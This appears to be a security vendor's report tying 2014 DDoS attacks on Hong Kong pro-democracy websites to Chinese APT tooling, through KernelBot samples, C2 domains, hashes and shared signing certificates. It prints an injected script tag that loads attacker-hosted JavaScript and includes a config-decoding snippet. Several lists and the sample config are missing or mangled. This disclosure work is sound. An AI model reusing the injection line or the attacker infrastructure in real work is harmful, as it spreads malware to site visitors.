As the pro-democracy movement in Hong Kong has continued, we’ve been watching for indications of confrontation taking place in cyberspace.
Protests began in September and have continued to escalate.
In recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against websites promoting democracy in Hong Kong.
According to the Wall Street Journal, websites belonging to Next Media’s Apple Daily publication have suffered from an ongoing DDoS attack that “brought down its email system for hours”.
According to other reports, Next Media’s network has suffered a “total failure” as a result of these attacks.
Additionally, at least one member of the popular online forum HKGolden was arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement.
The use of DDoS attacks as a political tool during times of conflict is not new; patriotic hacktivist groups frequently use them as a means to stifle political activity of which they disapprove.
The question of state sponsorship (or at least tacit approval) in online crackdowns is often up for debate and ambiguous from a technical evidence and tradecraft perspective.
In this case, however, we’ve discovered an overlap in the tools and infrastructure used by China-based advanced persistent threat (APT) actors and the DDoS attack activity.
We believe that these DDoS attacks are linked to previously observed APT activity, including Operation Poisoned Hurricane.
This correlation sheds light on the potential relationships, symbiosis and tool sharing between patriotic hacker activities designed to disrupt anti-government activists in China, and the APT activity we consistently see that is more IP theft and espionage-focused.
FireEye has identified a number of binaries coded to receive instructions from a set of command and control (C2) servers instructing participating bots to attack Next Media-owned websites and the HKGolden forum.
Next Media is a large media company in Hong Kong and the HkGolden forum has been used as a platform to organize pro-democracy protests.
Each sample we identified is signed with digital certificates that have also been used by APT actors to sign binaries in previous intrusion operations:
These binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as KernelBot .
All of the samples we identified have the “NewVersion” value of 20140926.
Structurally, all of these samples are similar in that they drop three files:
(md5 hash = 1685f978149d7ba8e039af9a4d5803c7)
• libssp-0.dll–malware DLL which is side-loaded by ctfmon.exe
to decode and launch KernelBot.
Most versions of this dll are also
signed by either the QTI or CallTogether certificate.
• readme.txt – a binary file which contains the XOR-encoded
KernelBot DLL as well as C2 destination information (most have
md5 hash of b5ac964a74091d54e091e68cecd5b532)
The KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the sample.
For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to both www.sapporo-digital-photoclub.com and wakayamasatei.com.
The full list of C2 servers we identified is as follows:
On Oct. 21, the control server at wakayamasatei.com responded with the following encoded configuration file:
[email protected][email protected]
This configuration file can be decoded by stripping the leading and trailing @[email protected] characters.
At this point, a simple base64 and XOR decode will reveal the plaintext configuration.
The following snippet of python code can be used to decode this command:
b64decoded = b64encoded.decode("base64")
command = ""
for c in b64decoded:
x = ord(c)
x = x ^ XOR_key
command += chr(x)
FireEye has observed two different single-byte XOR keys used to encode configuration files issued by the DDOS C2 servers in this campaign.
The two different keys are 0x2A or 0x7E.
The encoded configuration file shown above decodes to:
During the course of our research, we’ve observed more than 30 different unique configuration files issued by the C2 servers listed above.
These configurations issued commands to attack the following domains and IPs:
All of the above IPs host Next Media or Apple daily websites, with the exception of 58.64.139.10 and 124.217.214.149.
The IP 58.64.139.10 has hosted hkgolden.com - the domain for the HKGolden forum mentioned above.
For approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update to four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic.
The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec.com.
On Oct. 23, 2014, two of the active controls began instructing participating bots to cease attacks.
By Oct. 24, 2014, all five of the known active control servers were issuing commands to cease the attacks.
It should come as no surprise that hkgolden.com, nextmedia.com, and appledaily.com.hk websites are now or previously have been blocked by the Great Firewall of China – indicating that the PRC has found the content hosted on these sites objectionable.
The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI International and CallTogether code signing certificates, which we have seen in malware attributed to APT activity.
The QTI International digital certificate has been previously used to sign binaries used in APT activity including Operation Poisoned Hurricane.
Specifically, 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX variant signed by the QTI International certificate.
This PlugX variant connected to a Google Code project at code.google.com/p/udom/, where it decoded a command that configured its C2 server.
The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as well.
This sample was first observed during a drive-by attack in June 2014, and was downloaded from java-se.com/jp.jpg.
This sample is detected as Backdoor.APT.Preshin and connected to luxscena.com for C2.
The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed.
We detect this payload as Backdoor.APT.PISCES and it used hk.java-se.com for C2.
The java-se.com website was previously used in other attacks targeting the pro-democracy movement in Hong Kong.
We first observed the presence of malicious javascript inserted into Hong Kong Association for Democracy and People's Livelihood on June 26, 2014, which appeared as the following:
<script language=javascript src=http://java-se.com/o.js></script>">

version = "1.0"
reference_hash = "d08e038d318b94764d199d7a85047637"

$serial = {452156C3B3FB0176365BDB5B7715BC4C}

These ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden.com website.
As noted above, this site has been targeted with a DDoS attack by a KernelBot network.
We also found that the hkgolden.com website was compromised on Sept. 5, 2014 and had a redirect to a malicious javascript again hosted at another jave-se.com host.
Finally, as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec.com between Oct. 25, 2014 and Oct. 27, 2014.
As Brandon Dixon noted here, the java-sec.com domain is linked to the java-se.com by shared hosting history at the following IP address:
It is unclear why these actors would attack an IP address they were actively using.
It’s possible that the attackers wanted to test their botnet’s capability by attacking an IP they were using to gather statistics on the size of the attack.
It is also possible that the attackers simply made a mistake and accidentally issued commands to attack their own infrastructure.
On Oct. 24, 2014, after attacking their own infrastructure, the attackers issued new instructions to their botnet that ceased all attacks.
While not conclusive, the evidence presented above shows a link between confirmed APT activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy movement in Hong Kong.
The evidence does not conclusively prove that the same actors responsible for the DDoS attacks are also behind the observed intrusion activity discussed above – such as Operation Poisoned Hurricane.
Rather, the evidence may indicate that a common quartermaster supports both the DDoS attacks and ongoing intrusion activity.
In either scenario, there is a clear connection between the intrusion activity documented in Operation Poisoned Hurricane and the DDOS attacks documented here.
While the tactics of these activities are very different from a technical perspective, each supports distinct political objectives.
Operation Poisoned Hurricane’s objective appeared to have in part been IP theft possibly for economic gain or other competitive advantages.
In the DDOS attacks, the objective was to silence free speech and suppress the pro democracy movement in Hong Kong.
The Chinese government is the entity most likely to be interested in achieving both of these objectives.
